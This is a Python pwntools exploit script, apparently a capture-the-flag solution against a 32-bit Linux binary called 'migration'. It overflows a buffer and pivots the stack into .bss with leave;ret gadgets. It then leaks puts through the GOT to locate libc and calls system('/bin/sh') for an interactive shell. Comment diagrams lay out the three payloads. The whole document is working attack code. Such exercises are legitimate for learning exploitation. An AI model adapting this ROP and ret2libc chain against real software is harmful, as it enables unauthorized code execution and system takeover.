#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch = "i386", os = "linux", bits = 32)

elf = ELF("migration")
libc = elf.libc

buf  = elf.bss() + 0x700
buf2 = buf + 0x600

'''
    Gadgets
'''
leave_ret = 0x08048418  # leave ; ret
pop_ebx   = 0x0804836d  # pop ebx ; ret

p = process("migration")

'''
gdb.attach(p, """
        b *0x08048505
""")
'''

p.recv()

'''
------------
| payload1 |
------------

---------------------------------------------------------------------
| padding | prev ebp | ret addr | ret addr2 | argv1 | argv2 | argv3 |
---------------------------------------------------------------------
| "A"*40  |   buf    | read_plt | leave_ret |   0   |  buf  |  100  |
---------------------------------------------------------------------
'''

payload1  = "A" * 40
payload1 += flat([buf, elf.plt["read"], leave_ret, 0, buf, 100 ])

p.send(payload1)
print "[+] Send payload1 %d bytes." % len(payload1)
print "[+] Call read again."
print

'''
------------
| payload2 |
------------

-----------------------------------------------------------------------------------------------
| prev ebp | ret addr1 | ret addr2 |   argv1  | ret addr3 | ret addr4 | argv1 | argv2 | argv3 |
-----------------------------------------------------------------------------------------------
|   buf2   | puts_plt  |  pop_ebx  | puts_got | read_plt  | leave_ret |   0   | buf2  |  100  |
-----------------------------------------------------------------------------------------------
'''

payload2 = flat([buf2, elf.plt["puts"], pop_ebx, elf.got["puts"], elf.plt["read"], leave_ret, 0, buf2, 100 ])

p.send(payload2)
print "[+] Send payload2 %d bytes." % len(payload2)
print "[+] Leak puts address and call read again."
print

puts = u32(p.recv()[:4])
system = puts - libc.sym["puts"] + libc.sym["system"]
print "[+] puts address: 0x%08x." % puts
print "[+] libc address: 0x%08x." % (puts - libc.sym["puts"])
print "[+] system address: 0x%08x." % system
print

'''
------------
| payload3 |
------------

------------------------------------------------------------
| prev ebp  | ret addr1 | ret addr2 | argv1    | data      |
------------------------------------------------------------
|    buf    |  system   |  pop_ebx  | buf2+4*4 | "/bin/sh" |
------------------------------------------------------------
'''

payload3 = flat([buf, system, pop_ebx, buf2+4*4, "/bin/sh\x00"])
p.send(payload3)
print "[+] Send payload3 %d bytes." % len(payload3)
print "[+] Execute system(/bin/sh)."

p.interactive()
p.close()
